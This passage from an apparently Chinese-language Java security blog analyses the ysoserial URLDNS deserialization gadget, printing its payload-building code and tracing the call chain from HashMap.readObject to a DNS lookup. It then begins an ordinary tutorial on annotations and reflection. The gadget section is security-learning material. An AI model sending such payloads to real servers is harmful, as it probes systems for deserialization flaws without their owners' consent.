class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>    <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>    <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>    ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>    Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>    <span class="hljs-keyword">return</span> ht;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们前⾯说了，触发反序列化的⽅法是 readObject ，因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，所以导致可以构造利⽤链。</p><p>那么，我们可以直奔 HashMap 类的 readObject ⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>    s.defaultReadObject();<br>    reinitialize();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                         mappings);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>        <span class="hljs-comment">// Size the table using given load factor only if within</span><br>        <span class="hljs-comment">// range of 0.25...4.0</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>        <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-type">int</span>)fc));<br>        <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>        table = tab;<br><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//在这里用HashMap的键名计算了Hash</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只是简简单单的调用了Key的hashCode(),我们EXP传入的Key是一个URL对象，所以来看<code>java.net.URL#hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> hashCode;<br><br>    hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>开头会判断hashCode是否为-1，假如不是，则直接返回，这里就是我们之前Exp提到过的。<br>此处的handler是URLStreamHandler对象，然后跟进hashCode()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>     <span class="hljs-comment">// Generate the protocol part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>     <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>         h += protocol.hashCode();<br><br>     <span class="hljs-comment">// Generate the host part.</span><br>     <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>     <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>         h += addr.hashCode();<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>         <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>             h += host.toLowerCase().hashCode();<br>     &#125;<br><br>     <span class="hljs-comment">// Generate the file part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>     <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>         h += file.hashCode();<br><br>     <span class="hljs-comment">// Generate the port part.</span><br>     <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>         h += getDefaultPort();<br>     <span class="hljs-keyword">else</span><br>         h += u.getPort();<br><br>     <span class="hljs-comment">// Generate the ref part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>     <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>         h += ref.hashCode();<br><br>     <span class="hljs-keyword">return</span> h;<br> &#125;<br></code></pre></td></tr></table></figure><p>这里是对传入的URL进行解析，将每部分的Hash值叠加最后返回。这里调用了一个<code>getHostAddress()</code>，跟进</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">InetAddress addr <span class="hljs-operator">=</span> getHostAddress(u)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>    <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            u.hostAddress = InetAddress.getByName(host);<br>        &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> u.hostAddress;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键的地方<code>InetAddress.getByName(host);</code>，查看文档</p><blockquote><p>public static InetAddress getByName(String host) throws UnknownHostException<br>确定主机名称的IP地址。<br>主机名称可以是机器名称，例如“ java.sun.com ”或其IP地址的文本表示。 如果提供了文字IP地址，则只会检查地址格式的有效性。</p></blockquote><p>也就是进行DNS解析,来看最后的利用链，比较简单：</p><blockquote><p>HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()</p></blockquote><p>我们可以通过这条链很容易判断是否存在反序列化漏洞</p><p>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。</p><p>另外，ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀个 SilentURLStreamHandler 类，这不是必须的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java之反射与注解</title>
    <link href="/decemberus.com/2022/11/01/Java%E4%B9%8B%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/"/>
    <url>/decemberus.com/2022/11/01/Java%E4%B9%8B%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Java之反射与注解"><a href="#Java之反射与注解" class="headerlink" title="Java之反射与注解"></a>Java之反射与注解</h1><h1 id="注解Annotation"><a href="#注解Annotation" class="headerlink" title="注解Annotation"></a>注解Annotation</h1><h2 id="1、什么是注解"><a href="#1、什么是注解" class="headerlink" title="1、什么是注解"></a>1、什么是注解</h2><p>Annotation 是从JDK5.0开始引入的新技术 .</p><h3 id="Annotation的作用"><a href="#Annotation的作用" class="headerlink" title="Annotation的作用"></a>Annotation的作用</h3><p>不是程序本身 , 可以对程序作出解释.(这一点和注释(comment)没什么区别)</p><p>可以被其他程序(比如:编译器等)读取.</p><h3 id="Annotation的格式"><a href="#Annotation的格式" class="headerlink" title="Annotation的格式"></a>Annotation的格式</h3><p>注解是以”@注释名”在代码中存在的</p><p>还可以添加一些参数值 , 例如:@SuppressWarnings(value&#x3D;”unchecked”)</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300638.png" alt="image-20220929195515728"> </p><h3 id="Annotation在哪里使用"><a href="#Annotation在哪里使用" class="headerlink" title="Annotation在哪里使用?"></a>Annotation在哪里使用?</h3><p>可以附加在package , class , method , fifield 等上面 , 相当于给他们添加了额外的辅助信息</p><p>我们可以通过反射机制实现对这些元数据的访问</p><h2 id="2、内置注解"><a href="#2、内置注解" class="headerlink" title="2、内置注解"></a>2、内置注解</h2><p>下面提供一些常用的内置注解</p><h3 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h3><p>定义在 java.lang.Override 中 , 此注释只适用于修辞方法 , 表示一个方法声明打算重写超类中的另一个方法声明.</p><h3 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h3><p>定义在java.lang.Deprecated中 , 此注释可以用于修辞方法 , 属性 , 类 ,</p><p>表示不鼓励程序员使用这样的元素 , 通常是因为它很危险或者存在更好的选择 .</p><h3 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h3><p>定义在java.lang.SuppressWarnings中,用来抑制编译时的警告信息.</p><p>与前两个注释有所不同,你需要添加一个参数才能正确使用,这些参数都是已经定义好了的,我们</p><p>选择性的使用就好了 .</p><p>@SuppressWarnings(“all”)</p><p>@SuppressWarnings(“unchecked”)</p><p>@SuppressWarnings(value&#x3D;{“unchecked”,”deprecation”})</p><p>等等 </p><h2 id="3、元注解"><a href="#3、元注解" class="headerlink" title="3、元注解"></a>3、元注解</h2><p>元注解的作用就是负责注解其他注解 , Java定义了4个标准的meta-annotation类型,他们被用来提供对其他annotation类型作说明 .</p><p>这些类型和它们所支持的类在java.lang.annotation包中可以找到 .( @Target , @Retention ,@Documented , @Inherited )</p><p>@Target : 用于描述注解的使用范围(即:被描述的注解可以用在什么地方)</p><p>@Retention : 表示需要在什么级别保存该注释信息 , 用于描述注解的生命周期</p><p>(SOURCE &lt; CLASS &lt; RUNTIME)</p><p>@Document：说明该注解将被包含在javadoc中</p><p>@Inherited：说明子类可以继承父类中的该注解</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300481.png" alt="image-20220929205025676"> </p><h2 id="4、自定义注解"><a href="#4、自定义注解" class="headerlink" title="4、自定义注解"></a>4、自定义注解</h2><p>使用 @interface自定义注解时 , 自动继承了java.lang.annotation.Annotation接口</p><p><strong>分析 :</strong></p><p>1、@ interface用来声明一个注解 , 格式 : public @ interface 注解名 { 定义内容 }</p><p>2、其中的每一个方法实际上是声明了一个配置参数.</p><p>3、方法的名称就是参数的名称.</p><p>4、返回值类型就是参数的类型 ( 返回值只能是基本类型,Class , String , enum ).</p><p>5、可以通过default来声明参数的默认值</p><p>6、如果只有一个参数成员 , 一般参数名为value</p><p>7、注解元素必须要有值 , 我们定义注解元素时 , 经常使用空字符串,0作为默认值 </p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300905.png" alt="image-20220929212624141"> 可以看到上述示例代码</p><h1 id="反射机制Reflection"><a href="#反射机制Reflection" class="headerlink" title="反射机制Reflection"></a>反射机制Reflection</h1><h2 id="1、静态与动态语言"><a href="#1、静态与动态语言" class="headerlink" title="1、静态与动态语言"></a>1、静态与动态语言</h2><ul><li><p>动态语言</p><ul><li>是一类在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</li><li>主要动态语言：Object-C、C#、JavaScript、PHP、Python等。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//体现动态语言的代码 </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;var a=3;var b=5;alert(a+b)&quot;</span>;<br>    <span class="hljs-built_in">eval</span>(x); &#125;<br></code></pre></td></tr></table></figure></li><li><p>静态语言</p><ul><li>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++</li><li>Java不是动态语言，但Java可以称之为“准动态语言”。即Java有一定的动态性，我们可以利用反射机制获得类似动态语言的特性。Java的动态性让编程的时候更加灵活！</li></ul></li></ul><h2 id="2、Java-Reflection"><a href="#2、Java-Reflection" class="headerlink" title="2、Java Reflection"></a>2、Java Reflection</h2><p>Reflection（反射）是Java被视为动态语言的关键，反射机制允许程序在执行期借助于Reflflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>)<br></code></pre></td></tr></table></figure><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为：<strong>反射</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300729.png" alt="image-20220929220025130"> </p><h3 id="Java反射提供的功能"><a href="#Java反射提供的功能" class="headerlink" title="Java反射提供的功能"></a>Java反射提供的功能</h3><ul><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时判断任意一个类所具有的成员变量和方法</li><li>在运行时获取泛型信息</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>在运行时处理注解</li><li>生成动态代理</li></ul><h3 id="Java反射优点和缺点"><a href="#Java反射优点和缺点" class="headerlink" title="Java反射优点和缺点"></a>Java反射优点和缺点</h3><p>优点：可以实现动态创建对象和编译，体现出很大的灵活性 !</p><p>缺点：对性能有影响。使用反射基本上是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求。这类操作总是慢于 直接执行相同的操作</p><h2 id="3、反射主要的api"><a href="#3、反射主要的api" class="headerlink" title="3、反射主要的api"></a>3、反射主要的api</h2><p>java.lang.Class : 代表一个类</p><p>java.lang.reflflect.Method : 代表类的方法</p><p>java.lang.reflflect.Field : 代表类的成员变量</p><p>java.lang.reflflect.Constructor : 代表类的构造器</p><h2 id="4、Class类"><a href="#4、Class类" class="headerlink" title="4、Class类"></a>4、Class类</h2><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300460.png" alt="image-20220930190137096"> </p><p>这是一些基本方法，创建一个构造器，一个有参构造器，一个重写str方法</p><p>在Object类中定义了以下的方法，此方法将被所有子类继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Class <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>以上的方法返回值的类型是一个Class类，此类是Java反射的源头，实际上所谓反射从程序的运行结果来看也很好理解，即：可以通过对象反射求出类的名称</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300243.png" alt="image-20220930193349643"> </p><p>对象照镜子后可以得到的信息：某个类的属性、方法和构造器、某个类到底实现了哪些接口。对于每个类而言，JRE 都为其保留一个不变的 Class 类型的对象。一个 Class 对象包含了特定某个结构(class&#x2F;interface&#x2F;enum&#x2F;annotation&#x2F;primitive type&#x2F;void&#x2F;[])的有关信息</p><ul><li>Class 本身也是一个类</li><li>Class 对象只能由系统建立对象</li><li>一个加载的类在 JVM 中只会有一个Class实例</li><li>一个Class对象对应的是一个加载到JVM中的一个.class文件</li><li>每个类的实例都会记得自己是由哪个 Class 实例所生成</li><li>通过Class可以完整地得到一个类中的所有被加载的结构</li><li>Class类是Reflflection的根源，针对任何你想动态加载、运行的类，唯有先获得相应的Class对象</li></ul><p>下面代码介绍了获取class的多种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        person  person1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">student</span>();<br>        System.out.println(<span class="hljs-string">&quot;this is &quot;</span>+person1.name);<br>        <span class="hljs-comment">//通过对象获得</span><br>        Class c1=person1.getClass();<br>        <span class="hljs-comment">//通过forname获得</span><br>        Class c2=Class.forName(<span class="hljs-string">&quot;student&quot;</span>);<br>        <span class="hljs-comment">//通过类名.class获得</span><br>        Class c3=student.class;<br>        <span class="hljs-comment">//通过type获得</span><br>        Class c4=Integer.TYPE;<br>        <span class="hljs-comment">//获取父类类型</span><br>        Class c5=c2.getClass();<br>        System.out.println(c3.hashCode());<br>        System.out.println(c2.hashCode());<br>        System.out.println(c1.hashCode());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">student</span><span class="hljs-params">()</span>&#123;<br>        <span 